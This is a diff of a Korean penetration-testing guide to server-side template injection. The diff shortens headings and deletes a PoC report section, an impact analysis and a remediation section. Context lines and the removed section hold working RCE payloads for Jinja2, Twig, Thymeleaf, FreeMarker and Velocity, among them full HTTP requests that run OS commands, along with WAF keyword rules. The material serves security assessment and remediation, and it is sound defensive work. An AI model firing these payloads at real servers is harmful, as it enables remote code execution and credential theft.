@@ -1,13 +1,12 @@
 ---
 sidebar_position: 21
-title: 서버 사이드 템플릿 인젝션 (SSTI)
-description: 웹 진단 - SSTI 점검 절차, 엔진별 페이로드 (Jinja2/Twig/FreeMarker/Thymeleaf/ERB), 샌드박스 우회, PoC 양식
+title: SSTI
+description: 웹 진단 - SSTI 점검 절차, 엔진별 페이로드 (Jinja2/Twig/FreeMarker/Thymeleaf/ERB), 샌드박스 우회, 판정 기준
 keywords: [SSTI, Server-Side Template Injection, Jinja2, Twig, FreeMarker, Thymeleaf, ERB, Sandbox Escape, OWASP A05, RCE]
 draft: false
 ---
 
-# 서버 사이드 템플릿 인젝션 (Server-Side Template Injection, SSTI)
-
+# 서버 사이드 템플릿 인젝션
 > 사용자 입력이 **템플릿 엔진의 렌더링 컨텍스트** 에 그대로 삽입되어, 표현식으로 해석되는 취약점.
 > 단순 XSS 와 달리 대부분 **RCE 로 직결** 되며, 단일 결함만으로 시스템 침해 등급.
 
@@ -83,8 +82,7 @@ ${{7*7}}       ← Handlebars 변종
 
 응답에 `49` 가 보이면 그 구문을 사용하는 엔진에 SSTI 가능성. `7*7` 그대로 출력되면 템플릿 평가가 아니라 단순 출력 (XSS 영역).
 
-### Step 4. 엔진 정확 식별 (분기)
-
+### Step 4. 엔진 정확 식별
 같은 `{{ }}` 구문을 쓰는 엔진들도 동작이 미세하게 다름. 다음 표로 좁힘:
 
 | 페이로드 | Jinja2 (Python) | Twig (PHP) | FreeMarker (Java) | Thymeleaf | ERB (Ruby) |
@@ -169,8 +167,7 @@ ${7*7}               ← FreeMarker / Thymeleaf 분기용
 
 **판정**: 위 페이로드 중 하나로 명령 결과가 응답에 나오면 샌드박스 우회 성공.
 
-### 케이스 3: Twig (PHP / Symfony)
-
+### 케이스 3: Twig
 **언제 쓰는지**: Step 4 에서 `{{7*'7'}}` → `49`, 응답 헤더/에러에 PHP / Symfony 단서.
 
 **3-1. 정보 노출:**
@@ -194,8 +191,7 @@ ${7*7}               ← FreeMarker / Thymeleaf 분기용
 {{ ['id']|filter('system') }}
 ```
 
-### 케이스 4: FreeMarker (Java / Spring)
-
+### 케이스 4: FreeMarker
 **언제 쓰는지**: `${7*7}` → `49`, 응답에 Java / Spring 흔적 (`Whitelabel Error`, `freemarker.*` 에러).
 
 **4-1. RCE — Execute 유틸리티:**
@@ -231,8 +227,7 @@ GET /page/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id")
 
 > 점검 시 우선순위는 낮음 — 발생 조건이 매우 좁음. 다만 발견되면 임팩트는 RCE 라 High.
 
-### 케이스 6: ERB (Ruby / Rails)
-
+### 케이스 6: ERB
 **언제 쓰는지**: `<%= 7*7 %>` → `49`. Rails 의 ActionView 동적 렌더링이 사용자 입력을 받는 드문 케이스.
 
 **페이로드:**
@@ -269,8 +264,7 @@ GET /page/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id")
 
 **판정**: 위 변형 중 하나로 RCE 가 성공하면 샌드박스/필터가 우회된 것 — 취약.
 
-### 그 외 — 한 줄 언급만 (실무 빈도 낮음)
-
+### 그 외 — 한 줄 언급만
 발견 시 PayloadsAllTheThings 의 해당 항목으로 점프.
 
 - **Velocity (Java)** — `#set($x='')+$x.class.forName('java.lang.Runtime').getRuntime().exec('id')`
@@ -300,260 +294,6 @@ GET /page/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id")
 - [ ] Thymeleaf `th:text="${name}"` 변수 출력에서 `${7*7}` 이 그대로 나오면 정상 (자동 이스케이프) — 취약 아님
 - [ ] FreeMarker 2.3.30+ + Safer Resolver 환경에서 `?new()` 실패는 정상 (안전 설정이 적용된 상태)
 - [ ] 응답에 `49` 가 보여도 그게 우연히 입력의 일부거나, 다른 비즈니스 로직 결과일 수 있음 — `{{8*8}}` → `64`, `{{9*9}}` → `81` 로 교차 검증
-
----
-
-## PoC 양식 (보고서 붙여넣기용)
-
-### PoC 1 — [SSTI] Jinja2 표현식 인젝션을 통한 원격 명령 실행
-
-1. `<TARGET>` 의 닉네임 변경 기능 또는 인사말 출력 페이지의 `name` 파라미터에 페이로드 입력
-2. 응답에 표현식 평가 결과 (`49`) 가 출력되는 것을 확인 (1차 탐지)
-3. Jinja2 객체 그래프를 통해 `subprocess.Popen` 인덱스 식별 후 `id` 명령 실행
-4. 응답 본문에 `uid=33(www-data) gid=33(www-data)` 가 그대로 출력됨
-
-**1차 탐지 — 표현식 평가 확인:**
-
-```http
-GET /hello?name=%7B%7B7*'7'%7D%7D HTTP/1.1
-Host: <TARGET>
-Cookie: SESSION=<session>
-```
-
-**응답:**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html
-
-<h1>Hello, 7777777!</h1>
-```
-
-→ `{{7*'7'}}` 이 `7777777` 로 평가됨 = Jinja2 확정.
-
-**2차 — RCE:**
-
-```http
-GET /hello?name=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__()%5B398%5D(%27id%27%2Cshell%3DTrue%2Cstdout%3D-1).communicate()%20%7D%7D HTTP/1.1
-Host: <TARGET>
-Cookie: SESSION=<session>
-```
-
-(URL 디코딩하면: `{{ ''.__class__.__mro__[1].__subclasses__()[398]('id',shell=True,stdout=-1).communicate() }}`)
-
-**응답 — 취약 발현 증거:**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html
-
-<h1>Hello, (b'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n', None)!</h1>
-```
-
-**확인 사항:**
-- `name` 파라미터의 값이 서버 측 Jinja2 템플릿 엔진에서 평가됨
-- 객체 그래프를 통해 `subprocess.Popen` 에 접근 가능 → 임의 OS 명령 실행
-- `www-data` 권한이지만, 컨테이너 환경의 경우 내부 네트워크 피벗 및 자격증명 탈취 가능 (별첨)
-- 단일 결함만으로 시스템 침해 등급 = Critical
-
----
-
-### PoC 2 — [SSTI] Twig 정보 노출 → registerUndefinedFilterCallback 을 통한 RCE
-
-1. `<TARGET>` 의 페이지 빌더 / 동적 위젯 본문에 페이로드 입력
-2. `{{ dump(app) }}` 로 Symfony Application 객체 노출 확인 (1차 정보 노출 등급)
-3. `_self.env.registerUndefinedFilterCallback("system")` 를 통한 명령 실행 (Critical)
-
-**1차 — 정보 노출:**
-
-```http
-POST /widgets/preview HTTP/1.1
-Host: <TARGET>
-Content-Type: application/json
-Cookie: SESSION=<admin_session>
-
-{"content": "{{ dump(app) }}"}
-```
-
-**응답 (일부):**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html
-
-Symfony\Component\HttpKernel\Kernel { ... 
-  "secret": "s3cr3tK3y_changeme",
-  "database_url": "mysql://root:p@ssw0rd@db:3306/app",
-  ...
-}
-```
-
-→ Twig 확정 + 비밀키 / DB 자격증명 노출.
-
-**2차 — RCE:**
-
-```http
-POST /widgets/preview HTTP/1.1
-Host: <TARGET>
-Content-Type: application/json
-Cookie: SESSION=<admin_session>
-
-{"content": "{{ _self.env.registerUndefinedFilterCallback(\"system\") }}{{ _self.env.getFilter(\"id\") }}"}
-```
-
-**응답:**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html
-
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
-**확인 사항:**
-- `content` 필드 값이 Twig 엔진에서 그대로 렌더링됨
-- Symfony sandbox 가 비활성 상태로, `_self.env` 접근 가능
-- `registerUndefinedFilterCallback` 으로 임의의 PHP 함수 호출 → 임의 OS 명령 실행
-- 페이지 빌더 권한이 일반 관리자에게 부여되어 있어 관리자 단위 RCE 가능
-
----
-
-## 영향도 분석
-
-- **기밀성 (Confidentiality)**: 🔴 **매우 높음** — RCE 시 파일/DB 자격증명/세션 토큰 전체 노출
-- **무결성 (Integrity)**: 🔴 **매우 높음** — 임의 파일 변조, DB 직접 조작, 백도어 설치
-- **가용성 (Availability)**: 🔴 — 시스템 정지, 데이터 삭제, 컨테이너/호스트 장악
-- **추가 위협**:
-  - **내부 네트워크 피벗** — RCE 후 인접 서비스로 횡적 이동
-  - **클라우드 자격증명 탈취** — IMDS 호출로 EC2/ECS Role 자격증명 획득 (`ssrf.md` 의 시나리오와 결합)
-  - **CI/CD 침해** — 빌드 서버 / 배포 컨테이너에 SSTI 가 있으면 공급망 침해까지 직결
-  - **정보 노출만으로도 High** — `{{ config }}` / `{{ dump(app) }}` 으로 `SECRET_KEY` 노출 시 JWT 위조 등 연계
-
-**비즈니스 임팩트:**
-SSTI 는 발견 빈도는 다른 인젝션보다 낮지만, 발견되면 거의 모든 경우 RCE 로 직결되어 **단일 결함만으로 시스템 침해 등급**. 특히 페이지 빌더 / CMS / 이메일 템플릿 / 동적 위젯 등 사용자 입력이 템플릿 본문으로 들어가는 기능은 점검 우선순위 최상위로 분류해야 함.
-
----
-
-## 대응방안
-
-### 개발자 관점 (필수)
-
-1. **사용자 입력은 변수로만 전달, 절대 템플릿 문자열에 concat 금지** — 가장 흔한 안티패턴:
-
-   ```python
-   # 위험 — 사용자 입력이 템플릿 본문이 됨 (SSTI 그 자체)
-   render_template_string(f"Hello, {user_input}!")
-
-   # 안전 — 입력은 변수로만
-   render_template_string("Hello, {{ name }}!", name=user_input)
-   ```
-
-2. **샌드박스 환경 사용** — 사용자가 템플릿 본문을 작성해야만 하는 경우 (CMS, 이메일 템플릿 등):
-   - **Jinja2**: `SandboxedEnvironment` (단, 우회 사례 존재 — 케이스 2-3 참조. 신뢰 입력이 아니면 절대 사용 금지)
-   - **Twig**: `SandboxExtension` + 허용 태그/필터/함수 화이트리스트
-   - **FreeMarker**: `TemplateClassResolver.SAFER_RESOLVER` 또는 `ALLOWS_NOTHING_RESOLVER` + `new_builtin_class_resolver`
-   - **Velocity**: `SecureUberspector`
-
-3. **로직 없는 템플릿 엔진 사용 고려** — 가능하면 튜링 완전성을 가진 엔진 대신:
-   - Mustache, Handlebars (기본 모드), MJML 등 — 변수 치환만 지원
-   - SSTI 가 발생해도 RCE 로 이어지지 않음
-
-4. **입력 검증 / 이스케이프는 1차 방어책이 아님** — SSTI 는 이미 템플릿 컨텍스트에서 평가되므로, HTML 이스케이프 (`<` → `&lt;`) 로는 막을 수 없음. **구조적 분리** (1번) 가 본질.
-
-5. **에러 메시지 / 디버그 페이지 비공개** — Flask `DEBUG=False`, Symfony `APP_ENV=prod`, Spring Boot Whitelabel Error Page 비활성. 에러로 엔진 정보가 노출되면 공격 난이도가 급감.
-
-### 운영자 관점
-
-1. **WAF 룰 — 보조 수단** — `__class__`, `_self.env`, `?new()`, `{{` `}}` 등 키워드 차단 룰. 우회 변형이 많아 단독 의존은 금지.
-
-2. **컨테이너 격리 + 최소 권한** — 웹 워커는 `www-data` 비특권 사용자 + 컨테이너 격리 + IMDS v2 + 네트워크 정책. RCE 가 터져도 피해 면 축소.
-
-3. **모니터링** — 응답 본문에 OS 명령 출력 (`uid=`) 또는 환경 변수 패턴 (`/etc/passwd`) 이 포함된 응답 탐지/알람.
-
-### 안전 / 위험 코드 비교 (스택별)
-
-**Flask (Jinja2):**
-
-```python
-# 위험 1 — 사용자 입력이 템플릿 본문이 됨
-@app.route('/hello')
-def hello():
-    name = request.args.get('name', '')
-    return render_template_string(f"<h1>Hello, {name}!</h1>")    # SSTI
-
-# 위험 2 — 사용자가 작성한 템플릿을 그대로 렌더링
-@app.route('/preview', methods=['POST'])
-def preview():
-    return render_template_string(request.form['template'])     # SSTI
-
-# 안전 — 변수로만 전달
-@app.route('/hello')
-def hello():
-    name = request.args.get('name', '')
-    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
-
-# 사용자 템플릿을 정 받아야 한다면 SandboxedEnvironment (그래도 위험 — 우회 사례 있음)
-from jinja2.sandbox import SandboxedEnvironment
-env = SandboxedEnvironment()
-# 가능하면 Mustache/Handlebars 등 로직 없는 엔진으로 전환 권장
-```
-
-**Symfony (Twig):**
-
-```php
-// 위험 — 사용자 입력으로 Twig 템플릿 생성
-$template = $twig->createTemplate($request->get('content'));   // SSTI
-echo $template->render([]);
-
-// 안전 — 변수로만 전달
-echo $twig->render('hello.html.twig', [
-    'name' => $request->get('name'),     // 자동 이스케이프
-]);
-
-// 사용자가 템플릿을 작성해야 한다면 sandbox + 화이트리스트
-use Twig\Extension\SandboxExtension;
-use Twig\Sandbox\SecurityPolicy;
-
-$policy = new SecurityPolicy(
-    tags: ['if', 'for'],
-    filters: ['escape', 'upper', 'lower'],
-    methods: [],
-    properties: [],
-    functions: []
-);
-$twig->addExtension(new SandboxExtension($policy, true));
-```
-
-**Spring Boot (Thymeleaf):**
-
-```java
-// 위험 — 사용자 입력이 뷰 이름 결정
-@GetMapping("/page/{name}")
-public String page(@PathVariable String name) {
-    return name;        // ← 뷰 이름 자체가 사용자 입력 → SpEL 평가 가능 SSTI
-}
-
-// 안전 — 뷰 이름은 서버에서 고정, 사용자 입력은 모델로
-@GetMapping("/page/{name}")
-public String page(@PathVariable String name, Model model) {
-    model.addAttribute("name", name);    // 변수로만 전달 (자동 이스케이프)
-    return "page";                        // 뷰 이름은 고정
-}
-```
-
-**FreeMarker (Spring):**
-
-```java
-// 위험 — 기본 ObjectWrapper + 사용자 입력이 템플릿 본문
-Template t = new Template("x", new StringReader(userInput), cfg);
-t.process(data, out);     // SSTI + ?new() 로 RCE
-
-// 안전 — Safer resolver 적용 + 사용자 입력은 데이터 모델에만
-Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
-cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
-// 또는 SAFER_RESOLVER (꼭 필요한 클래스만)
-// 사용자 입력은 data 맵의 값으로만 전달, 템플릿 본문은 정적 파일
-```
 
 ---
 
